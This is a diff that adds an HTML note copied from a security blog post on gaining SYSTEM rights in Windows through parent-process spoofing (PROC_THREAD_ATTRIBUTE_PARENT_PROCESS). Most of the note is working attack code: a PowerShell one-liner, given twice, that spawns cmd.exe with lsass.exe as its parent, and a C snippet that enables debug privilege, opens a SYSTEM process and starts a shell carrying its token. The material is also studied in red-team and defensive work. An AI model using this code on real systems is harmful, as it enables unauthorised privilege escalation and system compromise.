@@ -1,0 +1,80 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</title>
+</head><body><a href="https://blog.xpnsec.com/becoming-system/">https://blog.xpnsec.com/becoming-system/</a>&nbsp; <br/>
+This method of becoming SYSTEM was actually revealed to me via a post from James Forshaw's <a href="https://tyranidslair.blogspot.co.uk/2017/08/the-art-of-becoming-trustedinstaller.html">walkthrough</a> of how to become "Trusted Installer".<br/>
+<br/>
+<a href="https://www.powershellgallery.com/packages/NtObjectManager/1.0.1">NtObjectManager</a>&nbsp;provides a nice easy way to achieve this using PowerShell:<br/>
+New-Win32Process cmd.exe -CreationFlags Newconsole -ParentProcess (Get-NtProcess -Name lsass.exe)<br/>
+<br/>
+How this technique works is by leveraging the CreateProcess Win32 API call, and using its support for assigning the parent of a newly spawned process via the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute.<br/>
+<br/>
+If we review the documentation of this setting, we see the following:<br/>
+<img src="image.png" /><br/>
+<br/>
+<br/>
+So, this means if we set the parent process of our newly spawned process, we will inherit the process token. This gives us a cool way to grab the SYSTEM account via the process token.<br/>
+<br/>
+We can create a new process and set the parent with the following code:<br/>
+====================================================================<br/>
+int pid;<br/>
+HANDLE pHandle = NULL;<br/>
+STARTUPINFOEXA si;<br/>
+PROCESS_INFORMATION pi;<br/>
+SIZE_T size;<br/>
+BOOL ret;<br/>
+<br/>
+// Set the PID to a SYSTEM process PID<br/>
+pid = 555;<br/>
+<br/>
+EnableDebugPriv();<br/>
+<br/>
+// Open the process which we will inherit the handle from<br/>
+if ((pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)) == 0) {<br/>
+&#09;printf("Error opening PID %d\n", pid);<br/>
+&#09;return 2;<br/>
+}<br/>
+<br/>
+// Create our PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute<br/>
+ZeroMemory(&amp;si, sizeof(STARTUPINFOEXA));<br/>
+<br/>
+InitializeProcThreadAttributeList(NULL, 1, 0, &amp;size);<br/>
+si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(<br/>
+&#09;GetProcessHeap(),<br/>
+&#09;0,<br/>
+&#09;size<br/>
+);<br/>
+InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &amp;size);<br/>
+UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;pHandle, sizeof(HANDLE), NULL, NULL);<br/>
+<br/>
+si.StartupInfo.cb = sizeof(STARTUPINFOEXA);<br/>
+<br/>
+// Finally, create the process<br/>
+ret = CreateProcessA(<br/>
+&#09;"C:\\Windows\\system32\\cmd.exe", <br/>
+&#09;NULL,<br/>
+&#09;NULL, <br/>
+&#09;NULL, <br/>
+&#09;true, <br/>
+&#09;EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, <br/>
+&#09;NULL,<br/>
+&#09;NULL, <br/>
+&#09;reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;si), <br/>
+&#09;&amp;pi<br/>
+);<br/>
+<br/>
+if (ret == false) {<br/>
+&#09;printf("Error creating new process (%d)\n", GetLastError());<br/>
+&#09;return 3;<br/>
+}<br/>
+====================================================================<br/>
+<br/>
+When compiled, we see that we can launch a process and inherit an access token from a parent process running as SYSTEM such as lsass.exe.<br/>
+<br/>
+The source for this technique can be found <a href="https://gist.github.com/xpn/a057a26ec81e736518ee50848b9c2cd6">here</a>. <br/>
+<br/>
+Alternatively, <a href="https://www.powershellgallery.com/packages/NtObjectManager/1.0.1">NtObjectManager</a>&nbsp;provides a nice easy way to achieve this using PowerShell:<br/>
+New-Win32Process cmd.exe -CreationFlags Newconsole -ParentProcess (Get-NtProcess -Name lsass.exe)<br/>
+</body></html>
